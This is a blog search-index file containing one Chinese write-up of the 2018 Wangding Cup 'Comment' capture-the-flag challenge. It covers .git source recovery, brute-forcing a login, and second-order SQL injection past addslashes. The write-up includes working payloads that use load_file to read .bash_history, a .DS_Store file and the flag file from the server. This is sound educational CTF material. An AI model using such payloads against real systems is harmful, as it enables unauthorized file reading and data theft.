<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2018[网鼎杯]Comment</title>
      <link href="/2020/04/21/2018-Comment/"/>
      <url>/2020/04/21/2018-Comment/</url>
      
        <content type="html"><![CDATA[<p>F12 发现存在/.git泄露</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419215153731.png" /><p>看wp知道因为没有commit文件所以泄露后的/.git 文件需要修复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --relog     进入泄露后的文件夹查看更改历史</span><br></pre></td></tr></table></figure><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419222831341.png" /><p>复制（refs/stash）的commit再改变HEAD的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br></pre></td></tr></table></figure><p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419223157595.png" alt="image-20200419223157595"></p><p>再次查看文件得到完整代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);      &#x2F;&#x2F;通过addslashes函数转义存入category的值</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);      &#x2F;&#x2F;通过id值从数据库中取出write时存入的category值</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;                  &#x2F;&#x2F;此时从数据库中取出的category值没有被add函数转义时存在的反斜杠符</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];&#x2F;&#x2F;利用从数据库取值绕过了第一次的add转义</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现存在二次注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">发帖</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">留言</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure><p>开始做题需要登录，根据提示用burp爆破得到密码后三位是数字666</p><p>用户名：<u>zhangwei</u></p><p>密码：<u>zhangwei666</u></p><p>开始利用二次注入读取需要的信息</p><p>addslashes函数会把’ “ %00 \ 这些字符前面加上一个\来转义他们。但留言sql语句中查询时的category值是根据id值从数据库中取出的。被addslashes函数转义后的值存入数据库后是不通过转义的（不带有\），所以取出时的category值也没有经过转义。即可利用这个点绕过addslashes函数转义，达到注入。</p><p><a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">关于addslashes函数的绕过总结</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line"><span class="comment">//多行注释符/**/</span></span><br><span class="line"><span class="comment">//单行注释符#</span></span><br></pre></td></tr></table></figure><p>注入</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150754087.png" style="zoom:50%;" /><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150831678.png" style="zoom:50%;" /><p>此时sql语句为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '',content=database(),/*',</span></span><br><span class="line"><span class="string">                content = '*/#',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150852164.png" style="zoom:50%;" /><p>暴出数据库ctf</p><p>尝试了暴表，但不可以。看wp知道是要读取文件。</p><p>Load_file函数的功能是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。不满足上述任意一个条件则返回null。</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153031171.png" style="zoom:50%;" /><p>看到/home/www下以bash身份运行。</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153333311.png" style="zoom: 67%;" /><p>.bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下。读取.bash_history文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;,content&#x3D;(select( load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153851015.png" alt="image" style="zoom:50%;" /><p>历史命令解析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp                 进入&#x2F;tmp </span><br><span class="line">unzip html.zip          解压html到当前目录下</span><br><span class="line">rm -rf html.zip         删除压缩包</span><br><span class="line">cp -r html &#x2F;var&#x2F;www&#x2F;    从&#x2F;var&#x2F;www 目录下复制html文件夹到&#x2F;tmp目录下</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html        进入&#x2F;var&#x2F;www&#x2F;html </span><br><span class="line">rm -rf .DS_Store        删除此文件夹里的.DS_Store文件</span><br></pre></td></tr></table></figure><p>所以可以知道此时的.DS_Store文件在/tmp/html 目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;,content&#x3D;(select hex( load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><p>hex转字符后</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160458085.png" alt="image-20200420160458085" style="zoom:80%;" /><p>后面还有</p><img src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160729757.png" alt="image-20200420160729757" style="zoom:80%;" /><p>flag与index.php在同一文件夹下。回到/var/www/html 目录下读取flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;, content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><p>因为html是从/var/www/复制过来的，第一次在/tmp/下读到的不对。</p><p>读取成功。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
